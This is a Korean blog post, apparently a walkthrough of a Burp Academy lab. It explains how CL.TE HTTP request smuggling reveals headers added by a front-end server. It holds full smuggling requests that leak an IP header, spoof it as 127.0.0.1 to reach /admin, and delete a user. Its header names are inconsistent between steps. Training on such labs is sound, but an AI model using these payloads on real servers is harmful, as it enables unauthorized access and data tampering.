---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Exploiting HTTP request smuggling to reveal front-end request rewriting"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-18 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/exploiting
- 난이도: PRACTITIONER (보통)

# 취약점 개요 (Revealing front-end request rewriting)
- 프론트엔드 서버가 백엔드 서버로 HTTP요청을 전달할 때 rewriting 을 수행하는 경우가 있다. 
- TLS세션을 끊고, 몇가지 커스텀 헤더를 추가한다. 
- 유저를 구분하기 위해 세션토큰 값에 따라 ID를 추가하거나, 송신측 IP주소를 추가하거나, TLS암호화 관련 정보를 추가하거나 하는 식이다. 
- 공격자에게는 맛있어보이는 부분이다. 

## HTTP Request Smuggling으로 rewriting 한 내용을 알아내는 방법

다음과 같은 스텝으로 공격할 수 있다. 
- 요청 파라메터가 응답에 표시되는 POST메서드를 찾는다. 
- 파라메터를 섞어서, 응답에 표시되는 파라메터가 메세지 보디의 마지막에 표시되도록 만든다. 
- 이 요청을 백엔드 서버에 스머글링한다. (다른 일반적인 요청의 바로 뒤에 스머그링되도록 한다.)

예를 들어 CL.TE패턴의 스머글링이 가능한 서버가 있다고 하자. 이 서버의 `POST /login`요청은 email파라메터의 값을 응답에 표시해준다. 정상적인 경우는 다음과 같은 HTTP 요청에 대해 

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

다음과 같은 응답을 돌려준다. 

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

공격자가 다음과 같은 요청을 보내서 `POST /login` 요청을 스머글링했다고 하자. 

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=
```

백엔드 서버입장에서는 다음과 같은 모양이다. 

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

스머글링 요청에 이어지는 정상적인 요청 `POST /login` 부분이 email 파라메터의 값처럼 취급된다.   
이 정상적인 HTTP 요청에는 프론트엔드 서버에서 rewriting 수행된 결과로 추가된 헤더도 포함되어 있다. 백엔드 서버는 `POST /login` 요청에 대한 결과로 email파라메터의 값을 회신해주기 때문에 결과적으로 다음과 같은 응답이 공격자에게 돌아온다! 😮 프론트엔드 서버가 추가한 헤더가 모두 노출된다. 신박하다. 

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

그리고 또 하나 중요한 점. 노출되는 응답의 크기는 스머글링용 요청의 Content-Length 헤더 값에 따라 달라진다. (위의 예에서 Content-Length: 100으로 지정된 부분이다.) 이를 너무 짧게 하면 노출되는 정보가 적어질 것이고, 너무 길게하면 나머지 바이트가 도착할 때까지 백엔드 서버가 대기하므로 타임아웃이 발생할 확률이 높아진다. 따라서 적절한 값을 지정해야 한다. 이를 위해서 일단 확실히 동작하는 작은 값부터 시작해서 서서히 늘려가면서 확인하면 좋다. 

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드 서버는 chunked encoding(TE헤더)을 지원하지 않는다. (즉, CL.TE패턴이다.)
- 관리자기능은 127.0.0.1 주소에서만 접근이 가능하다. 
- 프론트엔드 서버는 HTTP요청에 클라이언트의 IP주소를 적은 새로운 HTTP헤더를 추가한다.(rewriting)
- X-Forwarded-For 헤더와 비슷하지만 다른 이름의 헤더이다. 
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, 프론트엔드 서버가 추가한 헤더를 알아내서, 이 헤더를 추가하여 관리자 패널(`/admin`)에 접근해 carlos 유저를 삭제하면 된다. 

```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
```

# 풀이 
1. 일단 공격 가능 포인트를 찾는다. POST 메서드를 사용가능하고 파라메터값이 응답에 표시되는 부분이다. 랩에는 검색창이 있다. 검색버튼 클릭시 다음과 같은 요청과 응답이 수행되므로 조건에 맞는다. 

검색 요청 

```http
POST / HTTP/2
Host: 0a1200ea03e7d7128291cc690021000c.web-security-academy.net
Cookie: session=qbuTFVIaGF3ujGihNv1axrMWw35g2NRX
Content-Length: 10
Origin: https://0a1200ea03e7d7128291cc690021000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Referer: https://0a1200ea03e7d7128291cc690021000c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br

search=eee
```

검색 응답 

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3279

...
                   <header class="notification-header">
                    </header>
                    <section class=blog-header>
                        <h1>0 search results for 'eee'</h1>
                        <hr>
                    </section>
```

2. 스머글링을 시도해본다. CL.TE 패턴이다. 다음과 같은 요청을 보내본다. 

```
POST / HTTP/1.1
Host: 0a1200ea03e7d7128291cc690021000c.web-security-academy.net
Cookie: session=qbuTFVIaGF3ujGihNv1axrMWw35g2NRX
Content-Length: 100
Origin: https://0a1200ea03e7d7128291cc690021000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Referer: https://0a1200ea03e7d7128291cc690021000c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

search=
```

일정 부분 헤더가 노출되는 것을 확인했다. 프론트엔드 서버가 `X-lPAEPh-Ip`헤더를 추가하는 것을 알았다. (헤더명은 문제 랩마다 다르다.)

![스머글링 시도 결과](/images/burp-academy-hrs-8-1.png)

3. `X-lPAEPh-Ip` 헤더를 붙여서 관리자 페이지에 접근을 시도해본다. `GET /admin`을 시도해보면 `Duplicate header names are not allowed` 메세지가 회신된다. 프론트엔드 서버도 `X-lPAEPh-Ip` 헤더를 붙여주기 때문인 것으로 보인다. 

![관리자 페이지 접근 시도](/images/burp-academy-hrs-8-2.png)

4. 스머글링용 요청에 추가 헤더를 붙여서 관리자 페이지에 접근해본다. 

```http
POST / HTTP/1.1
Host: 0a4900e9041e0da08174de6f00a800bb.web-security-academy.net
Cookie: session=qbuTFVIaGF3ujGihNv1axrMWw35g2NRX
Content-Length: 129
Origin: https://0a1200ea03e7d7128291cc690021000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Referer: https://0a1200ea03e7d7128291cc690021000c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
X-nDvror-Ip: 127.0.0.1

search=
```

요청을 두 번 보내면 두번째 요청의 응답에서 관리자 페이지에 접근 성공한 것을 알 수 있다. 

![관리자 페이지 접근성공](/images/burp-academy-hrs-8-3.png)

5. 관리자 페이지에 접근 성공했으므로 이제 다음은 쉽다. carlos유저를 삭제하는 요청을 스머글링한다. 스머글링에 성공하면 302응답이 회신된다. 

![유저 삭제 성공](/images/burp-academy-hrs-8-4.png)

6. 문제 풀이 성공. 

![문제 풀이 성공](/images/burp-academy-hrs-8-success.png)

